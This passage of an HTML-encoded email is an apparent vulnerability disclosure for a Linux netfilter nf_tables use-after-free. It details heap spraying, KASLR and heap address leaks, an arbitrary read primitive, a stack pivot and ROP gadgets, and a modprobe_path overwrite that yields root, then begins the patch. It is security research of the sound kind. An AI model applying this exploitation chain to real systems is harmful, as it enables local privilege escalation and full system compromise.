e `list.next` pointer will be leaked.</p>
<p class=3D"MsoNormal">6) The last step leaked `&amp;table-&gt;chain`, whic=
h is a `list_head` structure inside a `nft_table`.</p>
<p class=3D"MsoNormal">7) Prepare another UAF condition and spray by using =
the table userdata feature (in table creation) to force `nla_memdup()` allo=
cations to occupy the `nft_object`.</p>
<p class=3D"MsoNormal">8) Place in the `nft_object` of the UAF the leaked a=
ddress of `&amp;table-&gt;chain`.</p>
<p class=3D"MsoNormal">9) Request the name of the object to leak `table-&gt=
;chain.next`, which has the address of one of the sprayed `nft_object` stru=
cts.</p>
<p class=3D"MsoNormal">10) Delete the third table to free all the sprayed `=
nft_object` structs.</p>
<p class=3D"MsoNormal">11) By using the userdata feature again, spray with =
table creation to make `nla_memdup()` allocations (0xc7-sized) to occupy th=
e now freed `nft_object` structs.</p>
<p class=3D"MsoNormal">12) Those `nla_memdup()` allocations will fill all t=
he structs with a fake `nft_object_ops`.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">After all these steps, we know for certain that the =
struct for which we know the address, contains a fake `nft_object_ops` stru=
ct. This covers all the requirements for the exploitation to work, which ar=
e:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">a) Know the KASLR base (predict address for gadgets =
and functions)</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">b) Know a heap address with our arbitrary contents (=
predict address with our fake `obj-&gt;ops`)</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">### Leaking ctx-&gt;table address</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Using the same trick we used in the KASLR base predi=
ction phase, we can make a `nft_object` be allocated right where our string=
 was.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">We can do this by providing a 0xc7-sized string for =
the object name:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">...</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">obj-&gt;key.table =3D table;</p>
<p class=3D"MsoNormal">obj-&gt;handle =3D nf_tables_alloc_handle(table);</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">obj-&gt;key.name =3D nla_strdup(nla[NFTA_OBJ_NAME], =
GFP_KERNEL);</p>
<p class=3D"MsoNormal">if (!obj-&gt;key.name) {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; err =3D -ENOMEM;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; goto err_strdup;</p>
<p class=3D"MsoNormal">}</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">...</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">This will leak us the `list.next` entry, that points=
 to `&amp;table-&gt;objects` (which is a `list_head` struct):</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal">struct nft_table {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct list_head&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct rhltable&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; chains_ht;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct list_head&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; chains;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct list_head&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sets;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct list_head&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objects;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct list_head&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flowtables;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp; hgenerator;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp; handle;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp; use;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp; family:6,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flags:8,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; genmask:2;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp; nlpid;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *=
name;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp; udlen;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp; *udata;</p>
<p class=3D"MsoNormal">};</p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">### Achieving arbitrary read primitive</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Through the `obj-&gt;key.name`, by taking control of=
 a freed-but-referenced `nft_object`, we can achieve an arbitrary read prim=
itive to read strings (or any data until a null terminator) at any valid ad=
dress in memory.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">To take over the control of a `nft_object` struct, w=
e can use `nla_memdup()` from the userdata buffers added to tables when set=
ting `NFTA_TABLE_USERDATA` on table creation:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">...</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">if (nla[NFTA_TABLE_USERDATA]) {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; table-&gt;udata =3D nla_memdup(nla[NFTA_TABLE_USERDATA], GFP_KERNE=
L);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; if (table-&gt;udata =3D=3D NULL)</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
goto err_table_udata;</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; table-&gt;udlen =3D nla_len(nla[NFTA_TABLE_USERDATA]);</p>
<p class=3D"MsoNormal">}</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">...</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">As we have arbitrary size and data, we can replace t=
he `nft_object` contents with our own, and, as we know the address of `&amp=
;table-&gt;objects`, we can get the address of one of the sprayed `nft_obje=
ct` structs that is pointed to by this entry.
 We have to point `obj-&gt;key.name` to this address and request the object=
 name.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">## Code execution and LPE</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">After we achieved all the requirements for the funct=
ion pointer hijack to be executed, this phase of the exploitation is a reus=
e of the previously mentioned primitives and refill techniques.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">This is the definition of `nft_object_ops`:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal">struct nft_object_ops {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (=
*eval)(struct nft_object *obj,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct nft_regs *regs,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; const struct nft_pktinfo *pkt);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; unsigned int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp; (*init)(const struct nft_ctx *ctx,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; const struct nlattr *const tb[],</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct nft_object *obj);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (=
*destroy)(const struct nft_ctx *ctx,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; struct nft_object *obj)=
;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp; (*dump)(struct sk_buff *skb,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct nft_object *obj,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bool reset);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (=
*update)(struct nft_object *obj,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; struct nft_object *newobj);</=
p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; const struct nft_object_type&nbsp;&nbsp;&nbsp; *type;</p>
<p class=3D"MsoNormal">};</p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">We need to first trigger the UAF, and use the `nla_m=
emdup()` refill to take control over `obj` and place our arbitrary contents=
 there. We should point `obj-&gt;ops` to the leaked `nft_object` address, w=
here our stack pivot gadget address is
 stored.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal">obj =3D *nft_set_ext_obj(ext);</p>
<p class=3D"MsoNormal">obj-&gt;ops-&gt;eval(obj, regs, pkt);</p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">The first argument is the `obj` address itself, so w=
e can find a stack pivot gadget to move the stack to `obj` and execute a RO=
P chain to achieve arbitrary code execution.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">We found the gadget: `push rdi ; pop rsp ; add cl, c=
l ; ret`, which is exactly what we need. The ROP chain will use a write-wha=
t-where gadget to write an arbitrary path into `modprobe_path`: `mov qword =
ptr [rdx], rax ; ret`.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">We can finally force the kernel to execute our own s=
cript as root by executing a dummy script with magic numbers unknown to the=
 kernel, resulting in a call to `call_modprobe()` to execute the usermode h=
elper, which is now our custom path.
 This will allow us to obtain root privileges outside the network namespace=
 (in the initial namespace).</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">## Patch</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">The main patch is pretty simple. It just makes sure =
that the current table is the one the set we refer (using its `SET_ID`) bel=
ongs to:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal">--- a/net/netfilter/nf_tables_api.c</p>
<p class=3D"MsoNormal">+++ b/net/netfilter/nf_tables_api.c</p>
<p class=3D"MsoNormal">@@ -3842,6 +3842,7 @@ static struct nft_set *nft_set=
_lookup_byhandle(const struct nft_table *table,</p>
<p class=3D"MsoNormal">}</p>
<p class=3D"MsoNormal">static struct nft_set *nft_set_lookup_byid(const str=
uct net *net,</p>
<p class=3D"MsoNormal">+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; const struct nft_table *t=
able,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
